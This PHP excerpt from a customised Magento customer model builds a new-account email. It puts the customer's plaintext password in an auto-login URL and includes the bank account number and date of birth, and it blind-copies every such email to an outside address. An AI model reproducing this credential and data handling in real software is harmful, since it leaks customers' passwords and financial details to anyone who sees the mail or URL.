...
class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
{
    ...
    public function sendNewAccountEmail($type = 'registered', $backUrl = '', $storeId = '0')
    {
        ...
        // Add Data here customer_dob
        $bankAcNR = $this->getData('bank_account_nr');
		$dob = date('d-m-Y', strtotime($this->getData('dob')));
		
		$subscriptionProduct = $this->findSubscriptionProduct();
		$subscriptionContainer ['ipad_titel'] = $subscriptionProduct->getAttributeText('ipad_titel');
		$subscriptionContainer ['ipad_abonnementsvorm'] = $subscriptionProduct->getAttributeText('ipad_abonnementsvorm');;
		//
		$subscriptionName = $subscriptionContainer ['ipad_titel'] . ' - ' . $subscriptionContainer ['ipad_abonnementsvorm'];
		
		/* @var $billingAddress Mage_Customer_Model_Address */
		$billingAddress = Mage::getModel('customer/address')
			->load($this->getData('default_billing'));
		$billingHtml = $billingAddress->format('html');

		$customerAutoLoginUrl = Mage::getUrl('abonnee/login/autheticate',array('u' => base64_encode($this->getEmail()), 'p' => $this->getPassword()));
		
		$this->_sendEmailTemplate($types[$type], self::XML_PATH_REGISTER_EMAIL_IDENTITY,
            array('customer' => $this, 'back_url' => $backUrl, 'bank_acc_nr' => $bankAcNR,
            		'cust_dob' => $dob,'subscription_name' => $subscriptionName, 
            		'billing_address' => $billingHtml, 'login_url' => $customerAutoLoginUrl)
        		, $storeId);
    ...
    public function findSubscriptionProduct() 
    {
    	$product = Mage::getModel('catalog/product');
    	$productId = $product->getIdBySku($this->getData('subscription_code'));
    	$product->load($productId);
//     	echo "<PRE>";
//     	print_r($product);exit;
    	if (!$product instanceof Mage_Catalog_Model_Product || !$product->getId()) {
    		Mage::throwException('Subscription for customer not found');
    	}
    	return $product;
    }
    ...
    protected function _sendEmailTemplate($template, $sender, $templateParams = array(), $storeId = null)
    {
        ...
        $emailInfo->addTo($this->getEmail(), $this->getName());
     	$emailInfo->addBcc('mail@pxn.nl');
//         $emailInfo->addBcc('subesh@facebook.com');
